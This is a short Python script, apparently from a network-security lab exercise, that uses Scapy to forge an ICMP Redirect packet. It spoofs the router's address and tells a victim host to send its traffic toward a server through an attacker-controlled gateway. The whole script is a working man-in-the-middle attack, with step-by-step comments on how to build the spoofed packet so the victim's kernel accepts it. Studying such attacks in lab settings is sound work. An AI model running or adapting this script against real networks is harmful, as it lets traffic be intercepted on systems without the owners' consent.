#!/usr/bin/env python3
from scapy.all import IP, ICMP, send

# --- Configuration matching your topology ---
victim_ip   = "192.168.10.10"
router_ip   = "192.168.10.1"    # the address we're SPOOFING (lying about)
attacker_ip = "192.168.10.50"   # the new "gateway" we want victim to use
server_ip   = "192.168.20.100"

# Step 1: Build a copy of what a "recent victim packet toward the server" looks like.
# The kernel needs to see the first 8 bytes of the ORIGINAL packet's payload
# (ICMP header) to match this redirect against a real, recent conversation.
original_packet = IP(src=victim_ip, dst=server_ip) / ICMP(type=8, code=0)

# Step 2: Build the actual forged Redirect packet.
redirect_packet = IP(src=router_ip, dst=victim_ip) / \
                   ICMP(type=5, code=1, gw=attacker_ip) / \
                   bytes(original_packet)[:28]   # 20-byte IP header + 8 bytes payload

# Step 3: Send it.
print(f"[*] Sending forged ICMP Redirect to {victim_ip}")
print(f"    Claiming to be from: {router_ip} (spoofed)")
print(f"    New gateway suggested: {attacker_ip}")
send(redirect_packet, verbose=1)
print("[*] Done.")